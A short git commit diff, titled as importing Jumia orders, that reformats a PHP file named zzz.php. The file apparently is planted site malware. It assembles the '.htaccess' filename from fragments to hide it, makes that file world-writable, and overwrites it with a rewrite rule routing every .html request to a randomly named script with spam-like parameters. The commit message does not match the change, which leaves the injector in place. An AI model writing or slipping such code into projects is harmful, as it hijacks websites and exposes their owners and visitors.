b5e9190ca9ae5f9dc654ae1774dcca47ba79f1d5
Luke <samary.xia@gmail.com>
2024-02-28 17:15:16 +0800

    feat: import jumia order

--- 8-mol-intouch/zzz.php
+++ 8-mol-intouch/zzz.php
@@ -2,16 +2,17 @@
 ignore_user_abort();
 set_time_limit(0);
 
-$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
-$ff = $f1.$f2.$f3;
+$f1 = ".ht";
+$f2 = "acc";
+$f3 = "ess";
+$ff = $f1 . $f2 . $f3;
 
-if (file_exists($ff)) chmod ($ff, 0777);
-if (filesize($ff)>120)
-{
-	$htout = fopen($ff, "w");
-	fwrite($htout, "RewriteEngine On 
+if (file_exists($ff)) chmod($ff, 0777);
+if (filesize($ff) > 120) {
+    $htout = fopen($ff, "w");
+    fwrite($htout, "RewriteEngine On 
 RewriteRule ^([A-Za-z0-9-]+).html$ oieahucczd5.php?world=5&looping=135&fn=2021st&hl=$1 [L]");
-fclose($htout);
+    fclose($htout);
 }
 
 ?>
